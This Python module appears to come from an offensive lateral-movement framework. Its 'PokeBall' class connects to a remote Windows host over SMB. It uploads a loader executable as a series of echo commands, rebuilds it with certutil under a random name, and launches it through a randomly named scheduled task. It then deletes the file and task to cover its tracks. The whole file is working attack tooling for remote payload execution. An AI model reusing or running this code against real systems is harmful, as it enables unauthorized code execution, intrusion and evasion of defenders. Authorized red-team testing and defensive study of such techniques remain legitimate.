# -*- coding: UTF-8 -*-

import logging
import os
import time

from tqdm import tqdm

from framework import utils
from framework.connector import init_smb_connection
from framework.connector import log_smb_info
from framework.helpers import ScheduleTaskHelper
from framework.pokeball import BasePokeBall


class PokeBall(BasePokeBall):
    desc = "Schedule task + echo + unsigned.exe (Vista+)"

    local_loader_path = None

    tree = None
    temp_name = None
    temp_path = None
    uploaded_temp = False
    loader_name = None
    loader_path = None
    uploaded_loader = False

    schtask_name = None
    schtask_created = False

    def init(self):
        self.payload_path = os.path.join(self.opts["data"], "payload", "pikachu.bin")
        if not os.path.exists(self.payload_path):
            raise Exception("{} does not existed".format(self.payload_path))
        self.local_loader_path = os.path.join(self.opts["data"], "loader", "console.exe")
        if not os.path.exists(self.local_loader_path):
            raise Exception("{} does not existed".format(self.local_loader_path))

        self.smb_conn = init_smb_connection(self.opts)
        log_smb_info(self.smb_conn)

        self.helper = ScheduleTaskHelper(self.opts, self.smb_conn)
        self.helper.init()

    def delivery_loader(self):
        self.tree = utils.get_random_location()
        self.temp_name = "{}.{}".format(utils.get_random_name(), utils.get_random_extension())
        self.loader_name = "{}.exe".format(self.pipe_name)

        temp_path = "{}\\{}".format(self.tree, self.temp_name)
        self.temp_path = temp_path
        loader_path = "{}\\{}".format(self.tree, self.loader_name)
        self.loader_path = loader_path

        echos = utils.file_to_echo_commands(self.local_loader_path, temp_path, 500)

        progress_bar = None
        for command_echo in echos:
            self.helper.execute_command(command_echo)
            self.uploaded_temp = True
            time.sleep(0.2)

            if progress_bar is None:
                logging.info("Uploading temp file: {}".format(temp_path))
                progress_bar = tqdm(total=len(echos), ncols=80, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} commands")
            progress_bar.update(1)
        progress_bar.close()

        logging.info("Decoding to file: {}".format(loader_path))
        command_decode = utils.command_certutil_decode(temp_path, loader_path)
        self.helper.execute_command(command_decode)
        self.uploaded_loader = True

        self.schtask_name = utils.get_random_name()
        self.helper.create_task(self.schtask_name, loader_path)
        self.schtask_created = True

        self.helper.run_task(self.schtask_name)
        time.sleep(2)

    def clean_up(self):
        if self.uploaded_temp:
            try:
                command = utils.command_delete_file(self.temp_path)
                self.helper.execute_command(command)
                logging.info("Deleted: {}".format(self.temp_path))
            except Exception as e:
                logging.error(e)

        if self.schtask_created:
            try:
                self.helper.stop_task(self.schtask_name)
            except:
                pass
            try:
                self.helper.delete_task(self.schtask_name)
            except Exception as e:
                logging.error(e)

        if self.uploaded_loader:
            try:
                command = utils.command_delete_file(self.loader_path)
                self.helper.execute_command(command)
                logging.info("Deleted: {}".format(self.loader_path))
            except Exception as e:
                logging.error(e)

        self.helper.clean_up()
